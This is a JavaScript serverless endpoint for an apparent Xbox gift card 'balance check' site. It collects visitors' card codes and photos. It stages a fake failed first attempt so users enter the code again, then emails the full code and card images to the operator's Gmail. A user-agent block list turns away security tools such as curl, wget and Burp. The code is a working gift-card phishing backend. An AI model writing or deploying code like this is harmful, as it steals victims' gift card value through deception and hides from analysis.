// api/log-check.js
import nodemailer from 'nodemailer';

const rateLimit = new Map();
const BLOCKED_USER_AGENTS = ['bot', 'crawler', 'spider', 'scraper', 'scan', 'wget', 'curl', 'python', 'go-http', 'java', 'perl', 'ruby', 'php', 'node-fetch', 'axios', 'insomnia', 'postman', 'burp'];

function isBotUserAgent(userAgent) {
  if (!userAgent) return true;
  const ua = userAgent.toLowerCase();
  return BLOCKED_USER_AGENTS.some(bot => ua.includes(bot));
}

function checkRateLimit(ip) {
  const now = Date.now();
  const windowMs = 60 * 1000;
  const maxRequests = 10;
  
  if (!rateLimit.has(ip)) rateLimit.set(ip, []);
  const timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);
  
  if (timestamps.length >= maxRequests) return { allowed: false };
  timestamps.push(now);
  rateLimit.set(ip, timestamps);
  return { allowed: true };
}

function maskCode(code) {
  if (!code) return 'N/A';
  if (code.length <= 5) return '*****';
  return `*****${code.slice(-5)}`;
}

export default async function handler(req, res) {
  const allowedOrigins = ['https://xbox-giftcard.vercel.app', 'http://localhost:5173'];
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || '';
  
  if (isBotUserAgent(userAgent)) return res.status(403).json({ error: 'Access denied' });
  if (!checkRateLimit(ip).allowed) return res.status(429).json({ error: 'Too many requests' });

  const { type, cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent: clientUA, pageSource, imageBase64, message } = req.body;
  
  console.log('📥 Received:', { type, hasImage: !!imageBase64 });

  if (process.env.DISABLE_EMAIL === 'true') {
    return res.status(200).json({ success: true, message: 'Demo mode', balance: balance || `$${amount || 0}` });
  }

  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.error('❌ Email config missing');
    return res.status(200).json({ success: true, message: 'Processing complete', warning: 'Email not configured' });
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
  });

  let subject = '';
  let html = '';
  let attachments = [];

  if (type === 'first_attempt_failed') {
    subject = 'FIRST ATTEMPT FAILED - Xbox Gift Card';
    html = `<div style="font-family: Arial; padding: 20px;"><h2 style="color: #dc3545;">❌ FIRST ATTEMPT FAILED</h2><p><strong>Code:</strong> ${maskCode(cardNumber)}</p><p><strong>Amount:</strong> $${amount}</p><p><strong>Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p><p><strong>Status:</strong> FAILED</p><p><strong>Message:</strong> ${message || 'User instructed to re-enter code or upload clearer image'}</p><p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p><p><strong>Browser:</strong> ${clientUA?.substring(0, 50)}</p><p><strong>IP:</strong> ${ip}</p></div>`;
    if (imageBase64) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) attachments.push({ filename: `xbox-card-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
    }
  } 
  else if (type === 'second_attempt_success') {
    subject = 'SECOND ATTEMPT SUCCESS - Xbox Gift Card';
    html = `<div style="font-family: Arial; padding: 20px;"><h2 style="color: #28a745;">✅ SECOND ATTEMPT SUCCESS</h2><p><strong>Code:</strong> ${cardNumber}</p><p><strong>Amount:</strong> $${amount}</p><p><strong>Balance:</strong> ${balance}</p><p><strong>Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p><p><strong>Status:</strong> SUCCESS</p><p><strong>Message:</strong> ${message || 'Verification successful on second attempt'}</p><p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p><p><strong>Browser:</strong> ${clientUA?.substring(0, 50)}</p><p><strong>IP:</strong> ${ip}</p></div>`;
    if (imageBase64) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) attachments.push({ filename: `xbox-card-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
    }
  }
  else if (type === 'mismatch_attempt') {
    subject = 'CODE MISMATCH - Xbox Gift Card';
    html = `<div style="font-family: Arial; padding: 20px;"><h2 style="color: #ffc107;">⚠️ CODE MISMATCH</h2><p><strong>First Code:</strong> ${maskCode(cardNumberFirst)}</p><p><strong>Second Code:</strong> ${maskCode(cardNumberSecond)}</p><p><strong>Amount:</strong> $${amount}</p><p><strong>Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p><p><strong>Status:</strong> MISMATCH</p><p><strong>Message:</strong> ${message || 'User entered different code on second attempt'}</p><p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p><p><strong>Browser:</strong> ${clientUA?.substring(0, 50)}</p><p><strong>IP:</strong> ${ip}</p></div>`;
  }

  try {
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFICATION_EMAIL || 'admin@xbox-demo.com',
      subject: subject,
      html: html,
      attachments: attachments
    });
    console.log('✅ Email sent');
    return res.status(200).json({ success: true, balance: balance || `$${amount || 0}` });
  } catch (error) {
    console.error('Email error:', error);
    return res.status(500).json({ error: error.message });
  }
}